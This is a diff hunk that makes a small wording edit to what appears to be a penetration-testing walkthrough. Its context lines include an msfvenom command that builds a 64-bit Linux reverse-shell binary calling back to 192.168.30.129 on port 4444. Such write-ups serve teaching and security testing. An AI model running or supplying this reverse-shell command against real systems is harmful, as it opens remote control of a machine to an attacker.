@@ -200,7 +200,7 @@ Awesome. `wget` is available and it's running 64-bit.
 x86_64
 ```
 
-Next, we can generate a 64-bit reverse shell with `msfvenom`.
+Next, generate a 64-bit reverse shell with `msfvenom`.
 
 ```
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.30.129 LPORT=4444 -f elf -o rev
